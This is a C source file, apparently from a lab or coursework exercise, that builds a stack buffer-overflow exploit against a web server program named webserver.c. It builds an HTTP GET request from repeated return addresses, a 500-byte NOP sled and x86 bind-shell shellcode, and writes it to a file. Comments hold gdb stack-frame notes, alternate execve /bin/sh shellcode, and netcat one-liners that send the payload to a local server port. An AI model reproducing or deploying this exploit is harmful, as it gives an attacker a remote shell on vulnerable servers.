#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/stat.h>
// #include<webserver.c>


//Server port: 9422, 9423
// nop is x90

unsigned char code[] =
"GET /";

int main()
{
	FILE *fr;
	fr = freopen("o.txt","w",stdout);
	int i;
	// printf("Shellcode Length: %d\n", strlen(code));


	for(i = 0; i < 60; i++) {
		// strcat(code,"\x94\xd1\xff\xff");//LOCAL
		// strcat(code,"\xe4\xd1\xff\xff");//LOCAL
		// strcat(code,"\x6f\xfe\xff\xff");//REMOTE tried 60-500 in 20 increments
		// strcat(code,"\x05\xff\xff\xbf");//REMOTE tried 50-500 in 20 increments and 500-100 in 25 increments, -250 from bfffffff!!!!!
		strcat(code,"\x05\xff\xff\xbf");//REMOTE tried 50-500 in 20 increments and 500-100 in 25 increments, -250 from bfffffff!!!!!
	}
	// printf("Shellcode Length: %d\n", strlen(code));
	for(i = 0; i < 500; i++) {
		strcat(code,"\x90");
	}
	// strcat(code,"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80 HTTP");
	// strcat(code,"\x31\xc0\x50\x40\x89\xc3\x50\x40\x50\x89\xe1\xb0\x66\xcd\x80\x31\xd2\x52\x66\x68\x13\xd2\x43\x66\x53\x89\xe1\x6a\x10\x51\x50\x89\xe1\xb0\x66\xcd\x80\x40\x89\x44\x24\x04\x43\x43\xb0\x66\xcd\x80\x83\xc4\x0c\x52\x52\x43\xb0\x66\xcd\x80\x93\x89\xd1\xb0\x3f\xcd\x80\x41\x80\xf9\x03\x75\xf6\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80 HTTP");
	strcat(code,"\x31\xc0\x50\x40\x89\xc3\x50\x40\x50\x89\xe1\xb0\x66\xcd\x80\x31\xd2\x52\x66\x68\x4b\xde\x43\x66\x53\x89\xe1\x6a\x10\x51\x50\x89\xe1\xb0\x66\xcd\x80\x40\x89\x44\x24\x04\x43\x43\xb0\x66\xcd\x80\x83\xc4\x0c\x52\x52\x43\xb0\x66\xcd\x80\x93\x89\xd1\xb0\x3f\xcd\x80\x41\x80\xf9\x03\x75\xf6\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80 HTTP");
	// strcat(code,"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80");
    // printf("Shellcode Length: %d\n", strlen(code));
    // printf("Code is: %s\n",code);
    printf(code);
	fclose(fr);
    return 0;
}

// Stack level 0, frame at 0xffffd0e0:
//  eip = 0x56555e2d in handle (webserver.c:98); saved eip = 0x56555cd6
//  called by frame at 0xffffd150
//  source language c.
//  Arglist at 0xffffd0d8, args: request=0x56559170 "GET /index.html HTTP\n", is_html=0xffffd0f8
//  Locals at 0xffffd0d8, Previous frame's sp is 0xffffd0e0
//  Saved registers:
//   ebx at 0xffffd0d0, ebp at 0xffffd0d8, esi at 0xffffd0d4, eip at 0xffffd0dc

// $2 = (char (*)[100]) 0xffffd050
// (gdb) p &is_html
// $3 = (int **) 0xffffd0e4

//webserver output
// ADDR+140: FFFFD16C
// ADDR: FFFFD0DE

//BFFF


// \x8c\x0d\xff\xff
// echo -e "GET /index.html \x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80 HTTP" | nc 127.0.0.1 9422
// echo -e "GET \x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80 HTTP" | nc 127.0.0.1 9422
// echo -e "GET \x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80 HTTP" | nc 127.0.0.1 9422
// echo -e "GET \index.html \x8c\x0d\xff\xff\x8c\x0d\xff\xff\x8c\x0d\xff\xff\x8c\x0d\xff\xff\x8c\x0d\xff\xff\x8c\x0d\xff\xff\x8c\x0d\xff\xff\x8c\x0d\xff\xff\x8c\x0d\xff\xff\x8c\x0d\xff\xff\x8c\x0d\xff\xff\x8c\x0d\xff\xff\x8c\x0d\xff\xff\x8c\x0d\xff\xff\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80 HTTP" | nc 127.0.0.1 8000